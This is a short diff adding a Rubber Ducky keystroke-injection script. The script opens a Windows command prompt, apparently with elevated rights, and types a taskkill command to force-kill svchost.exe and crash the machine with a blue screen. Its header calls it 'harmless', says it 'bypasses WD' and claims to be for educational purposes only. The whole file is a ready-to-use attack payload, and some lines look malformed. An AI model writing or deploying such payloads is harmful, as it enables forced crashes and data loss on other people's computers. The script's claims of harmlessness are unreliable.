@@ -1,0 +1,20 @@
+REM Title: BSOD rubber ducky
+REM Author: xdev
+REM DESC: Simple harmless rubber ducky that causes a BSOD to every windows device. Also bypasses WD.
+
+
+GUI
+DELAY 500
+STRING cmd
+DELAY 500
+LEFT
+DELAY 500
+DOWN
+DELAY 500
+RIGHT
+DELAY 500
+ENTER
+STRING
+echo Hello, This script was made by xdev for --EDUCATIONAL-- Purposes only.
+DELAY 500
+STRING taskkill /f /im /svchost.exe
